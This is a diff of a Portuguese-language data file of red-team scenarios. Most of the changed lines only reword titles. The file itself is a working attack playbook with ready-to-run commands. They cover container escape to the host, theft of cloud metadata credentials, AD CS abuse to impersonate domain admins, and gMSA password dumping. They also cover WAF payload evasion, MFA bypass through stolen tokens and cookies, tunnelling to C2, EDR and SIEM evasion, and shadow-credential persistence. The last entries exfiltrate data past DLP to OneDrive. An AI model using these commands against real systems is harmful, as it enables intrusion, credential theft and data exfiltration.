-        title: '2. Escape para o Host via `CAP_SYS_ADMIN` / `--privileged` / `docker.sock`',
+        title: "2. Fuga para o host através de `CAP_SYS_ADMIN` / `--privileged` / `docker.sock`",
         description: 'Se o container correr como privilegiado (`CapEff: 0000003fffffffff`), montar diretamente o disco físico do host (`/dev/sda1` ou `/dev/nvme0n1p1`) ou abusar de `cgroup release_agent` / `core_pattern` em `/proc/sys/kernel/core_pattern`.',
         command: 'capsh --print\nfdisk -l\nmkdir /mnt/host && mount /dev/sda1 /mnt/host && chroot /mnt/host /bin/bash',
         mitreIds: ['T1611', 'T1609'],
         opsecRisk: 'MÉDIO'
       },
       {
-        title: '3. Acesso à Cloud Metadata API (IMDSv1 / IMDSv2 - 169.254.169.254)',
+        title: "3. Acesso à API de metadados da cloud (IMDSv1 / IMDSv2 - 169.254.169.254)",
         description: 'Se o cluster correr em AWS EKS, Azure AKS ou GCP GKE, consultar o Instance Metadata Service a partir do container para roubar as credenciais IAM do Worker Node.',
         command: 'TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")\ncurl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/',
         mitreIds: ['T1552.005', 'T1078.004'],
@@ -422,15 +422,15 @@ export const ICE_BREAKER_SCENARIOS = [
   },
   {
     id: 'blk-adcs-kerberos-hardened',
-    title: 'Active Directory Hardened: Sem Contas Kerberoastable Fracas e LAPS Ativo',
-    category: 'Credential Access & AD',
+    title: "Active Directory reforçado: sem contas frágeis expostas a Kerberoasting e com LAPS ativo",
+    category: "Acesso a credenciais e Active Directory",
     severity: 'ALTO',
     defenseMechanism: 'Group Managed Service Accounts (gMSA - senhas de 120 chars), LAPS, Tiered Administration e SMB Signing',
     symptom: 'BloodHound não mostra caminhos diretos de `GenericAll` para Domain Admins; todas as contas de serviço usam senhas longas/gMSA impossíveis de quebrar offline e o SMB Signing impede NTLM Relay clássico para SMB.',
     academicContext: 'Em ambientes Active Directory maduros, os vetores clássicos (Kerberoasting RC4, LLMNR Poisoning -> SMB Relay) são mitigados. O foco ofensivo desloca-se para Active Directory Certificate Services (AD CS), Resource-Based Constrained Delegation (RBCD), Shadow Credentials e ACLs subtis.',
     bypassSteps: [
       {
-        title: '1. Auditoria e Abuso de Templates AD CS (ESC1, ESC4, ESC8)',
+        title: "1. Auditoria e abuso de modelos de certificados AD CS (ESC1, ESC4, ESC8)",
         description: 'Enumerar Certificate Authorities e Templates com `Certipy`. Se um template permitir `ENROLLEE_supplies_subject` (ESC1) para Domain Computers/Users, requisitar um certificado com SAN de um Domain Admin. Se o Web Enrollment (`http://ca/certsrv`) estiver ativo, realizar NTLM Relay para HTTP (ESC8 - não é afetado por SMB Signing!).',
         command: 'certipy find -u user@dominio.local -p \'Password123\' -dc-ip 10.10.10.5 -vulnerable -stdout\ncertipy req -u user@dominio.local -p \'Password123\' -ca CORP-CA -template VulnTemplate -upn administrator@dominio.local',
         mitreIds: ['T1649', 'T1557.001', 'T1558'],
@@ -444,7 +444,7 @@ export const ICE_BREAKER_SCENARIOS = [
         opsecRisk: 'STEALTH'
       },
       {
-        title: '3. Leitura de Passwords gMSA (`msDS-ManagedPassword`)',
+        title: "3. Leitura de palavras-passe gMSA (`msDS-ManagedPassword`)",
         description: 'Contas gMSA não podem ser crackadas, mas se comprometermos um host ou grupo autorizado no atributo `PrincipalsAllowedToRetrieveManagedPassword`, podemos ler o blob `msDS-ManagedPassword` diretamente via LDAP sobre TLS e calcular o hash NTLM/AES.',
         command: 'gMSADumper.py -u \'MAQUINA$\' -p \':NTLMHASH\' -d dominio.local -l 10.10.10.5',
         mitreIds: ['T1552', 'T1087.002'],
@@ -455,29 +455,29 @@ export const ICE_BREAKER_SCENARIOS = [
   },
   {
     id: 'blk-waf-web-exploit',
-    title: 'WAF (Cloudflare / AWS WAF / ModSecurity) Bloqueando Payloads SQLi / RCE / Upload',
-    category: 'Initial Access & Web',
+    title: "WAF (Cloudflare / AWS WAF / ModSecurity) a bloquear payloads SQLi / RCE e carregamentos de ficheiros",
+    category: "Acesso inicial e aplicações web",
     severity: 'ALTO',
     defenseMechanism: 'Web Application Firewall (WAF) Deep Packet Inspection, CRS Ruleset e Rate Limiting',
     symptom: 'Conseguiste identificar uma vulnerabilidade na aplicação web (SQL Injection, SSTI, Deserialization ou File Upload), mas qualquer payload funcional devolve `403 Forbidden` do WAF.',
     academicContext: 'WAFs operam como proxies reversos que analisam cabeçalhos HTTP, URI e corpo do pedido através de expressões regulares e heurísticas. Contudo, os WAFs possuem limites de tamanho de buffer de inspeção (`RequestBodyLimit`), discrepâncias de parsing entre o WAF e o servidor backend (HTTP Parameter Pollution / Content-Type Smuggling) e cegueira para o IP de origem real se não estiver isolado.',
     bypassSteps: [
       {
-        title: '1. Descoberta do IP de Origem Direto (Bypass Total de CDN/WAF)',
+        title: "1. Descoberta direta do IP de origem (contorno de CDN/WAF)",
         description: 'Consultar certificados históricos (`crt.sh` / Censys), registos DNS antigos (SecurityTrails), registos SPF/MX ou forçar a aplicação a fazer um pedido SSRF/Out-of-Band para descobrir o IP real do servidor backend e enviar o exploit diretamente para o IP com o header `Host:` configurado.',
         command: 'curl -sk -H "Host: app.alvo.com" https://IP_REAL_ORIGEM/api/vuln-endpoint -d "payload"',
         mitreIds: ['T1190', 'T1590.002', 'T1596'],
         opsecRisk: 'STEALTH'
       },
       {
-        title: '2. Padding de Corpo HTTP (WAF Buffer Overflow / Inspection Limit Bypass)',
+        title: "2. Preenchimento do corpo HTTP (WAF Buffer Overflow / contorno dos limites de inspeção)",
         description: 'Muitos WAFs Cloud (ex: AWS WAF / Azure WAF) inspecionam apenas os primeiros 8 KB, 16 KB ou 64 KB do corpo de um pedido `POST` por motivos de latência. Preceder o parâmetro malicioso com 65 KB de parâmetros ou JSON junk legítimo faz o WAF deixar passar o resto sem inspeção.',
         command: 'python3 -c \'print("junk=" + "A"*70000 + "&cmd=id")\' | curl -X POST -d @- https://app.alvo.com/endpoint',
         mitreIds: ['T1190', 'T1027'],
         opsecRisk: 'BAIXO'
       },
       {
-        title: '3. Mutação de Encoding (Charset `ibm037` / `utf-16be` / Chunked Transfer / JSON Unicode)',
+        title: "3. Alteração da codificação (Charset `ibm037` / `utf-16be` / Chunked Transfer / JSON Unicode)",
         description: 'Enviar o corpo do pedido codificado em `Content-Type: application/x-www-form-urlencoded; charset=ibm037` ou usar escapes Unicode em JSON (`\\u0073\\u0065\\u006c\\u0065\\u0063\\u0074`) que o WAF não descodifica mas o framework backend (Spring/ASP.NET/Node) processa nativamente.',
         command: 'curl -X POST https://app.alvo.com/api -H "Content-Type: application/json" -d \'{"query":"\\u0055\\u004e\\u0049\\u004f\\u004e \\u0053\\u0045\\u004c\\u0045\\u0043\\u0074..."}\'',
         mitreIds: ['T1190', 'T1132.001'],
@@ -488,15 +488,15 @@ export const ICE_BREAKER_SCENARIOS = [
   },
   {
     id: 'blk-mfa-entra-cloud',
-    title: 'MFA & Conditional Access Bloqueando Acesso Cloud (Entra ID / Microsoft 365 / AWS)',
-    category: 'Initial Access & Cloud',
+    title: "MFA e Conditional Access a bloquear o acesso à cloud (Entra ID / Microsoft 365 / AWS)",
+    category: "Acesso inicial e cloud",
     severity: 'CRÍTICO',
     defenseMechanism: 'Multi-Factor Authentication (FIDO2 / Authenticator Number Matching) + Entra ID Conditional Access (Device Compliance / IP Location)',
     symptom: 'Obtiveste credenciais válidas de um utilizador ou administrador Cloud, mas o login bloqueia por exigir MFA ou um dispositivo "Compliant / Hybrid Azure AD Joined".',
     academicContext: 'O Conditional Access avalia sinais no momento da emissão do token OAuth2/OIDC (localização de rede, estado de conformidade Intune e reivindicações MFA). Contudo, tokens de sessão já emitidos no endpoint da vítima ou fluxos de autenticação delegados permitem contornar essa barreira.',
     bypassSteps: [
       {
-        title: '1. Extração de Primary Refresh Token (PRT) & Cookies de Sessão no Endpoint',
+        title: "1. Extração de Primary Refresh Token (PRT) e cookies de sessão no endpoint",
         description: 'Se já tens execução na estação Windows da vítima (Hybrid Joined), extrair o PRT ou usar `ROADtoken` / Mimikatz `sekurlsa::cloudap` para derivar um cookie `x-ms-RefreshTokenCredential` válido que já inclui a claim de MFA e Device Compliance.',
         command: 'roadtx.exe prt -a renew\n// Ou injetar Cookie ESTSAUTHPERSISTENT extraído do browser da vítima',
         mitreIds: ['T1528', 'T1539', 'T1550.001'],
@@ -510,7 +510,7 @@ export const ICE_BREAKER_SCENARIOS = [
         opsecRisk: 'BAIXO'
       },
       {
-        title: '3. Tunelamento do Browser através da Máquina da Vítima (SOCKS5 + User-Agent Match)',
+        title: "3. Túnel do navegador através da máquina da vítima (SOCKS5 e correspondência de User-Agent)",
         description: 'Quando o Conditional Access restringe por IP Corporativo e Device ID, correr um proxy SOCKS no beacon da máquina da vítima ou usar `SharpChrome` / Remote Debugging Port (`--remote-debugging-port=9222`) no próprio browser da vítima.',
         command: 'chisel.exe client https://c2:8443 R:socks',
         mitreIds: ['T1090.001', 'T1185'],
@@ -521,15 +521,15 @@ export const ICE_BREAKER_SCENARIOS = [
   },
   {
     id: 'blk-sysmon-siem-recon',
-    title: 'SOC / SIEM Detetando Comandos de Reconhecimento (`whoami`, `net`, `nltest`, `arp`)',
-    category: 'Discovery & Stealth',
+    title: "SOC / SIEM a detetar comandos de reconhecimento (`whoami`, `net`, `nltest`, `arp`)",
+    category: "Descoberta e furtividade",
     severity: 'MÉDIO',
     defenseMechanism: 'Sysmon Event ID 1 (Process Creation) + Windows Security Event ID 4688 (Command-Line Auditing) + EDR Behavioral Rules',
     symptom: 'Assim que executas `whoami /all`, `net group "Domain Admins" /domain` ou `SharpHound`, o SOC recebe um alerta de severidade alta e isola o host.',
     academicContext: 'Regras Sigma padrão em qualquer SIEM monitorizam a criação de processos filhos de `cmd.exe`/`powershell.exe` que invoquem binários clássicos de enumeração (`whoami.exe`, `net.exe`, `net1.exe`, `nltest.exe`, `quser.exe`, `tasklist.exe`) num curto intervalo de tempo.',
     bypassSteps: [
       {
-        title: '1. In-Process Discovery via BOFs (Beacon Object Files) e Win32/Native APIs',
+        title: "1. Descoberta dentro do processo através de BOFs (Beacon Object Files) e APIs Win32/Native",
         description: 'Nunca criar novos processos (`CreateProcess`) para enumeração. Executar BOFs em memória dentro do próprio processo do agente que chamam diretamente `GetTokenInformation`, `NetGroupGetUsers`, `DsEnumerateDomainTrusts` ou `NtQuerySystemInformation`.',
         command: '// Em Cobalt Strike / Sliver / Havoc (Zero Process Creation):\ninline-execute situ_awareness_bof.o\nldapsearch "(adminCount=1)" --attributes samaccountname',
         mitreIds: ['T1106', 'T1087.002', 'T1033'],
@@ -543,8 +543,8 @@ export const ICE_BREAKER_SCENARIOS = [
         opsecRisk: 'BAIXO'
       },
       {
-        title: '3. Recolha ADSI / LDAP Throttling com Jitter (Stealth BloodHound)',
-        description: 'Em vez de correr `SharpHound -c All` (que gera milhares de conexões SMB em segundos), usar `--CollectionMethod DCOnly` (apenas consultas LDAP ao DC, zero conexões SMB para workstations) com `--Throttle` e `--Jitter`.',
+        title: "3. Recolha ADSI / LDAP com limitação da frequência e jitter (BloodHound discreto)",
+        description: "Em vez de correr `SharpHound -c All` (que gera milhares de ligações SMB em segundos), usar `--CollectionMethod DCOnly` (apenas consultas LDAP ao DC, zero ligações SMB para workstations) com `--Throttle` e `--Jitter`.",
         command: 'SharpHound.exe --CollectionMethod DCOnly --Throttle 1500 --Jitter 30',
         mitreIds: ['T1087.002', 'T1069.002', 'T1482'],
         opsecRisk: 'STEALTH'
@@ -555,7 +555,7 @@ export const ICE_BREAKER_SCENARIOS = [
   {
     id: 'blk-persistence-autoruns',
     title: 'Persistência Removida pelo Blue Team: Run Keys e Scheduled Tasks Detetadas',
-    category: 'Persistence & Stealth',
+    category: "Persistência e furtividade",
     severity: 'MÉDIO',
     defenseMechanism: 'Sysinternals Autoruns Auditing + Sysmon Event ID 13 (Registry) + Event ID 4698 (Scheduled Task Created)',
     symptom: 'Chaves em `HKCU\\...\\Run` ou tarefas `schtasks /create` são rapidamente identificadas e limpas pelos analistas de resposta a incidentes.',
@@ -576,7 +576,7 @@ export const ICE_BREAKER_SCENARIOS = [
         opsecRisk: 'BAIXO'
       },
       {
-        title: '3.Persistência ao Nível de Identidade / Domínio (Silver Ticket / AdminSDHolder / Shadow Credentials)',
+        title: "3. Persistência ao nível da identidade / domínio (Silver Ticket / AdminSDHolder / Shadow Credentials)",
         description: 'Em vez de persistir num host monitorizado com EDR, persistir na camada de identidade do Active Directory adicionando uma chave em `msDS-KeyCredentialLink` de uma conta de computador ou adicionando uma ACL `WriteDacl` no contentor `CN=AdminSDHolder,CN=System`.',
         command: 'certipy shadow add -u admin@dominio.local -p \'Pass\' -account DC01$',
         mitreIds: ['T1098', 'T1556.006', 'T1484'],
@@ -587,22 +587,22 @@ export const ICE_BREAKER_SCENARIOS = [
   },
   {
     id: 'blk-dlp-exfiltration',
-    title: 'DLP (Data Loss Prevention) Bloqueando Upload / Exfiltração de Ficheiros',
-    category: 'Exfiltration',
+    title: "DLP (Data Loss Prevention) a bloquear o carregamento ou a exfiltração de ficheiros",
+    category: "Exfiltração",
     severity: 'MÉDIO',
     defenseMechanism: 'Enterprise DLP (Symantec / Purview / Forcepoint) + Proxy Upload Quota & Content Inspection',
     symptom: 'Tentativas de enviar arquivos `.zip`/`.7z` ou dumps de base de dados para fora da rede são bloqueadas pelo Proxy ou geram alerta de DLP.',
     academicContext: 'Soluções de DLP inspecionam cabeçalhos mágicos de ficheiros (Magic Bytes), entropia elevada, padrões regex (cartões de crédito, PII, confidencial) em uploads HTTP `POST`/`PUT` e anexos de e-mail, além de bloquear domínios de file-sharing.',
     bypassSteps: [
       {
-        title: '1. Cifragem Customizada + Esteganografia / Camuflagem de Formato (Low Entropy Chunking)',
+        title: "1. Cifragem personalizada e esteganografia / camuflagem de formato (blocos de baixa entropia)",
         description: 'Cifrar os dados com AES-256, codificar em Base64/Words de baixa entropia e embutir em estruturas JSON ou imagens PNG válidas, dividindo em pequenos blocos (`Data Transfer Size Limits`) enviados com delays pelo próprio canal de C2.',
         command: '// Dividir arquivo cifrado em chunks de 64KB enviados em pedidos GET/POST JSON normais com jitter',
         mitreIds: ['T1030', 'T1027', 'T1041', 'T1001.002'],
         opsecRisk: 'STEALTH'
       },
       {
-        title: '2. Exfiltração para Cloud Storage Corporativo Homologado (OneDrive / SharePoint / S3)',
+        title: "2. Exfiltração para armazenamento empresarial autorizado na cloud (OneDrive / SharePoint / S3)",
         description: 'O DLP de rede geralmente confia no tráfego destinado ao tenant Microsoft 365 ou AWS S3/GitHub Enterprise usando APIs oficiais HTTPS.',
         command: 'curl -X PUT -H "Authorization: Bearer $GRAPH_TOKEN" --data-binary @dados.bin "https://graph.microsoft.com/v1.0/me/drive/root:/backup_telemetry.dat:/content"',
         mitreIds: ['T1567.002'],
